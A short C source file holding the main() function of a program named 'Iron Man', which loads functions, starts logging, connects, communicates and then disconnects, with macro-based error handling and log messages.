#include "communication/connection.h"
#include "functions/functions.h"
#include "logging/logging.h"

int main() {
    INITIALIZE_RESULT(res);

    res = load_all_functions();
    HANDLE_ERROR_RESULT(res)

    res = start_logging();
    HANDLE_ERROR_RESULT(res)

    WRITE_LOG(CRITICAL, "Started Iron Man", NULL)

    res = connect_();
    HANDLE_ERROR_RESULT(res)

    WRITE_LOG(WARNING, "Connected", NULL)
    res = communicate();
    WRITE_LOG(WARNING, "Disconnected", NULL)

    error_cleanup:

    disconnect();

    WRITE_LOG(CRITICAL, "Stopped Iron Man", NULL)

    stop_logging();

    return EXIT_SUCCESS;
}
